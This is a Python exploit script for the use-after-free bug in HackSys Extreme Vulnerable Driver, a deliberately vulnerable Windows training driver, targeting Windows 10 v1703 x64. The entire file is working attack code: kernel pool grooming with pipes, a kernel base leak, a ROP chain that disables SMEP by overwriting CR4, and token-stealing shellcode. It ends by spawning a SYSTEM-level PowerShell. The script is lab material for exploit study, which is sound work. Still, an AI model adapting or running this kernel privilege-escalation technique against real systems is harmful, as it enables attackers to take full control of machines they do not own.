#!/usr/bin/python
#
# HEVD v1.20 UseAfterFree exploit for Windows 10 v1703 x64 by @acru3l.
#

import sys
import struct
from ctypes import *
from ctypes.wintypes import *

ioctl_AllocateUaFObject = 0x222013
ioctl_UseUaFObject = 0x222017
ioctl_FreeUaFObject = 0x22201B
ioctl_AllocateFakeObject = 0x22201F

device_name = r'\\.\HackSysExtremeVulnerableDriver'
hFile = None

def pusha():
    '''
    alernative to pusha on x86
    '''
    # assembled with metasm
    code = ''
    code += '\x50'                                      # push rax
    code += '\x53'                                      # push rbx
    code += '\x51'                                      # push rcx
    
    return code

def popa():
    '''
    alternative to popa on x86
    '''
    # assembled with metasm
    code = ''
    code += '\x59'                                      # pop rcx
    code += '\x5b'                                      # pop rbx
    code += '\x58'                                      # pop rax
    
    return code

def shellcode():
    '''
    token stealing shellcode
    '''
    # assembled with metasm
    # steal token
    code = ''
    code += pusha()
    code += '\x65\x48\x8b\x04\x25\x88\x01\x00\x00'      # mov rax,[gs:0x188]        ; 0x188 = offset nt!_KPCR.PcrbData.CurrentThread
    code += '\x48\x8b\x80\xb8\x00\x00\x00'              # mov rax,[rax+0xb8]        ; 0xB8  = offset nt!_KTHREAD.ApcState.Process
    code += '\x48\x89\xc3'                              # mov rbx,rax
    code += '\x48\x8b\x9b\xe8\x02\x00\x00'              # mov rbx,[rbx+0x2e8]       ; 0x2E8 = offset nt!_EPROCESS.ActiveProcessLinks.Flink
    code += '\x48\x81\xeb\xe8\x02\x00\x00'              # sub rbx,0x2e8
    code += '\x48\x8b\x8b\xe0\x02\x00\x00'              # mov rcx,[rbx+0x2e0]       ; 0x2E0 = offset nt!_EPROCESS.UniqueProcessId
    code += '\x48\x83\xf9\x04'                          # cmp rcx,4
    code += '\x75\xe5'                                  # jnz $-0x19
    code += '\x48\x8b\x8b\x58\x03\x00\x00'              # mov rcx,[rbx+0x358]       ; 0x358 = offset nt!_EPROCESS.Token
    code += '\x48\x89\x88\x58\x03\x00\x00'              # mov [rax+0x358],rcx
    code += popa()
    # recover rsp
    code += '\x65\x48\x8b\x04\x25\x88\x01\x00\x00'      # mov rax,[gs:0x188]        ; 0x188 = offset nt!_KPCR.PcrbData.CurrentThread
    code += '\x48\x8b\x40\x38'                          # mov rax,[rax+0x38]        ; 0x38  = offset nt!_KTHREAD.StackBase
    code += '\x48\x2d\x58\x08\x00\x00'                  # sub rax,0x858
    code += '\x48\x89\xc4'                              # mov rsp,rax
    code += '\xc3'                                      # ret
    
    return code

def alloc_buffer(data):
    windll.kernel32.VirtualAlloc.argtypes = [LPVOID, c_size_t, DWORD, DWORD]
    windll.kernel32.VirtualAlloc.restype = LPVOID
    
    buffer = windll.kernel32.VirtualAlloc(
        0,
        len(data),
        0x00003000,                                     # MEM_COMMIT | MEM_RESERVE
        0x40)                                           # PAGE_EXECUTE_READWRITE
    
    memmove(buffer, data, len(data))
    
    return buffer

def build_ropchain(kernel_base, shellcode_addr):
    '''
    trampoline to shellcode
    '''
    chain = ''
    chain += struct.pack('<Q', kernel_base + 0xb0b63)   # mov rsp, r11; pop r15; ret;
    chain += struct.pack('<Q', kernel_base + 0x597b)    # pop rcx; ret;
    chain += struct.pack('<Q', 0x506f8)                 # rcx
    chain += struct.pack('<Q', kernel_base + 0x108552)  # mov cr4, rcx; ret;
    chain += struct.pack('<Q', shellcode_addr)
    
    return chain

def open_device():
    '''
    (re)open vulnerable device
    '''
    global hFile
    
    if hFile > 0:
        windll.kernel32.CloseHandle(hFile)
    
    hFile = windll.kernel32.CreateFileA(
        device_name,
        0xC0000000,                                     # GENERIC_READ | GENERIC_WRITE
        0x00000001,                                     # FILE_SHARE_READ
        0,                                              # NULL
        3,                                              # OPEN_EXISTING
        0x80,                                           # FILE_ATTRIBUTE_NORMAL
        0)                                              # NULL
    
    if hFile == -1:
        print '[-] Failed to open device: %s' % device_name
        return False
    else:
        #print '[+] Device opened successfully: %s' % device_name
        return True

def call_AllocateUaFObject():
    '''
    DeviceIoControl wrapper
    '''
    open_device()
    bytes_retn = c_ulong(0)
    
    windll.kernel32.DeviceIoControl.argtypes = [HANDLE, DWORD, LPVOID, DWORD, LPVOID, DWORD, POINTER(DWORD), LPVOID]
    windll.kernel32.DeviceIoControl.restype = BOOL
    
    windll.kernel32.DeviceIoControl(
        hFile,
        ioctl_AllocateUaFObject,
        struct.pack('<L', 0xcafebabe),
        4,
        0,
        0,
        byref(bytes_retn),
        0)

def call_UseUaFObject():
    '''
    DeviceIoControl wrapper
    '''
    open_device()
    bytes_retn = c_ulong(0)
    
    windll.kernel32.DeviceIoControl.argtypes = [HANDLE, DWORD, LPVOID, DWORD, LPVOID, DWORD, POINTER(DWORD), LPVOID]
    windll.kernel32.DeviceIoControl.restype = BOOL
    
    windll.kernel32.DeviceIoControl(
        hFile,
        ioctl_UseUaFObject,
        struct.pack('<L', 0xcafebabe),
        4,
        0,
        0,
        byref(bytes_retn),
        0)

def call_FreeUaFObject():
    '''
    DeviceIoControl wrapper
    '''
    open_device()
    bytes_retn = c_ulong(0)
    
    windll.kernel32.DeviceIoControl.argtypes = [HANDLE, DWORD, LPVOID, DWORD, LPVOID, DWORD, POINTER(DWORD), LPVOID]
    windll.kernel32.DeviceIoControl.restype = BOOL
    
    windll.kernel32.DeviceIoControl(
        hFile,
        ioctl_FreeUaFObject,
        struct.pack('<L', 0xcafebabe),
        4,
        0,
        0,
        byref(bytes_retn),
        0)

def call_AllocateFakeObject(data):
    '''
    DeviceIoControl wrapper
    '''
    open_device()
    bytes_retn = c_ulong(0)
    
    windll.kernel32.DeviceIoControl.argtypes = [HANDLE, DWORD, LPVOID, DWORD, LPVOID, DWORD, POINTER(DWORD), LPVOID]
    windll.kernel32.DeviceIoControl.restype = BOOL
    
    windll.kernel32.DeviceIoControl(
        hFile,
        ioctl_AllocateFakeObject,
        alloc_buffer(data),
        len(data),
        0,
        0,
        byref(bytes_retn),
        0)

def groom_pool(n):
    '''
    groom nonpaged pool
    '''
    num_holes = n / 4
    print '[+] Allocating 0x%x objects' % n
    
    windll.kernel32.CreatePipe.argtypes = [POINTER(HANDLE), POINTER(HANDLE), LPVOID, DWORD]
    windll.kernel32.CreatePipe.restype = BOOL
    
    windll.kernel32.WriteFile.argtypes = [HANDLE, LPVOID, DWORD, POINTER(DWORD), LPVOID]
    windll.kernel32.WriteFile.restype = BOOL
    
    buff_size = 0x70 - 0x48

    handles = []
    for i in xrange(n):
        rpipe  = HANDLE(0)
        wpipe = HANDLE(0)
        windll.kernel32.CreatePipe(
            byref(rpipe),
            byref(wpipe),
            0,
            buff_size)
        
        bytes_written = c_ulong(0)
        windll.kernel32.WriteFile(
            wpipe,
            alloc_buffer('A' * buff_size),
            buff_size,
            byref(bytes_written),
            0)
        
        if i > n - num_holes * 2:
            handles.append((rpipe, wpipe))

    print '[+] Creating 0x%x holes' % num_holes
    
    # we need holes of size 0x70
    for h in handles[::2]:
        windll.kernel32.CloseHandle(h[0])
        windll.kernel32.CloseHandle(h[1])

def get_kernel_base():
    '''
    find base address of the kernel via EnumDeviceDrivers
    '''
    array = c_ulonglong * 0x400
    addr = array()
    
    windll.psapi.EnumDeviceDrivers.argtypes = [POINTER(LPVOID), DWORD, POINTER(DWORD)]
    windll.psapi.EnumDeviceDrivers.restype = BOOL
    
    res = windll.psapi.EnumDeviceDrivers(
            cast(byref(addr), POINTER(LPVOID)),
            sizeof(addr),
            byref(c_ulong(0)))
    if not res:
        return None
    
    # Kernel is the first entry of the result
    return addr[0]

def break_code():
    import time
    time.sleep(0.5)
    windll.kernel32.DebugBreak()

def disclaimer():
    print "[!] Lame UaF exploit. Try at your own risk."

if __name__ == '__main__':
    
    disclaimer()
    
    if not open_device():
        sys.exit(1)
    
    print '[+] Grooming Kernel Pool'
    
    # this doesn't work as expected... needs to be fixed
    groom_pool(0x20000)
    
    print '[+] Allocating UaF object'
    
    call_AllocateUaFObject()
    
    print '[+] Freeing UaF object'
    
    call_FreeUaFObject()
    
    base_addr = get_kernel_base()
    if not base_addr:
        print '[-] Failed to obtain Kernel base'
        sys.exit(1)
    print '[+] Kernel base address: 0x%016x' % base_addr
    
    shellcode_addr = alloc_buffer(shellcode())
    if not shellcode_addr:
        print '[-] Failed to allocate shellcode'
        sys.exit(1)
    print '[+] Shellcode allocated at 0x%016x' % shellcode_addr
    
    ropchain = build_ropchain(base_addr, shellcode_addr)
    fake_obj = ropchain + 'A' * (0x58 - len(ropchain))
    
    print '[+] Allocating fake objects'
    
    for i in xrange(0x8000):
        # cause a memory leaks...
        call_AllocateFakeObject(fake_obj)
    
    print '[+] Triggering fake callback func'
    
    call_UseUaFObject()
    
    # Got SYSTEM shell?
    import os
    os.system("powershell.exe")
    
